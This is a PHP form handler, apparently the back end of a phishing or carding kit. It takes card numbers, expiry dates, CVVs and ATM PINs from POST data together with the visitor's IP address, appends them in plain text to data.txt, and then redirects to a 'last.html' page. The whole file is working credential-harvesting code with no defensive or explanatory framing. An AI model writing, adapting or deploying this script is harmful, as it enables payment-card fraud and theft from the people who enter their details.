<?php
// Function to get the client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get client IP first
    $ipAddress = getClientIP();

    // Sanitize input data
    $cardNumber = htmlspecialchars($_POST['CardNumber']);
    $expiryMonth = htmlspecialchars($_POST['CardExpiryMonth']);
    $expiryYear = htmlspecialchars($_POST['CardExpiryYear']);
    $cvv = htmlspecialchars($_POST['CVV']);
    $atmPin = htmlspecialchars($_POST['AtmPin']);

    // Format the data for saving
    $formData = "IP Address: $ipAddress\nCard Number: $cardNumber\nExpiry Date: $expiryMonth/$expiryYear\nCVV: $cvv\nATM Pin: $atmPin\n\n";

    // Save the data in a text file
    $file = fopen("data.txt", "a");
    fwrite($file, $formData);
    fclose($file);

    // Redirect to the next page
    header("Location: last.html");
    exit();
}
?>

